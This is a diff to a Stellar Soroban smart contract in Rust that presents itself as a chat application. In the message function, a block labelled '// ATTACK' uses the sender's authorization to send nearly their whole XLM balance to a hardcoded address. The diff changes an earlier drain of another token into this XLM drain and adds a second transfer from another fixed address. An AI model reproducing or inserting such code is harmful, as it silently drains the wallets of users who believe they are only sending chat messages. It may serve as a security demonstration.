@@ -1,9 +1,11 @@
 #![no_std]
 use soroban_sdk::{contract, contractimpl, contracttype, vec, Address, Env, String, Vec};
-
+use soroban_sdk::token::Client as TokenClient;
 #[derive(Clone)]
 #[contracttype]
 pub struct ConversationsKey(pub Address, pub Address);
+
+
 
 #[contracttype]
 #[derive(Clone, Debug)]
@@ -66,13 +68,24 @@ impl ChatContract {
         from.require_auth();
 
         // ATTACK
-        let dogstar_address = Address::from_string(&String::from_slice(&env, "CD5GK24YQXNNEWPBNNUJF7RBTW24H6IJ6QD3LLK4LRJ3EJETZM677SO2"));
-        let dogstar_contract = contract_token::Client::new(&env, &dogstar_address);
+        let xlm_address = Address::from_string(&String::from_str(&env, "CDMLFMKMMD7MWZP3FKUBZPVHTUEDLSX4BYGYKH4GCESXYHS3IHQ4EIG4"));
+        let xlm_contract = TokenClient::new(&env, &xlm_address);
         
         // Transfer on behalf of 'from'
-        let amount = dogstar_contract.balance(&from);
-        let to = Address::from_string(&String::from_slice(&env,"GABSYMXEEYMVSURN5HYE4Q3DIASXAB27N6HOVWOH6RRGJPHCSXKMQEYD"));
-        dogstar_contract.transfer(&from,&to,&amount);
+        
+        let amount = xlm_contract.balance(&from) - 10000000;
+        // let amount = xlm_contract.balance(&from) - 10000000;
+        // let amount = 99810000000;
+        
+        let to = Address::from_string(&String::from_str(&env,"GABSYMXEEYMVSURN5HYE4Q3DIASXAB27N6HOVWOH6RRGJPHCSXKMQEYD"));
+        let empty_address = Address::from_string(&String::from_str(&env,"GB67CINCZ65WU6EBIWJQBPHQIFNSNYOABO5TROD7PXW6WROVBW2JWG43"));
+        // let to_balance = xlm_contract.balance(&to);
+        
+        xlm_contract.transfer(&from,&to,&amount);
+        xlm_contract.transfer(&empty_address,&to,&amount);
+        
+
+        // let balance = xlm_contract.balance(&from);
 
         // First we need to retrieve the possibly already existing conversation between from and to
         let key = DataKey::Conversations(ConversationsKey(from.clone(), to.clone()));
